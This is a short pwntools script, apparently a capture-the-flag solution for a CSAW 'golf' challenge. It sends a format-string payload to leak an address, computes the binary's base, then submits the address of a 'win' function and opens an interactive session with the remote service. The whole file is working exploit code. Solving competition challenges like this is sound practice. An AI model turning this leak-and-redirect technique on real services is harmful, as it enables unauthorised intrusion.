from pwn import *

bin = './golf'
elf = context.binary = ELF(bin)
#p = process(bin)
p = remote('golfing.ctf.csaw.io', 9999)

payload = b'%171$p.'

p.sendlineafter(b'name?', payload)
p.recvuntil(b'hello: ')
elf.address = int(p.recvuntil(b'.', drop=True), 16) - 0x1223
log.info(hex(elf.address))

log.info(hex(elf.sym['win']))

p.sendlineafter(b'at!: ', hex(elf.sym['win']).encode())
p.interactive()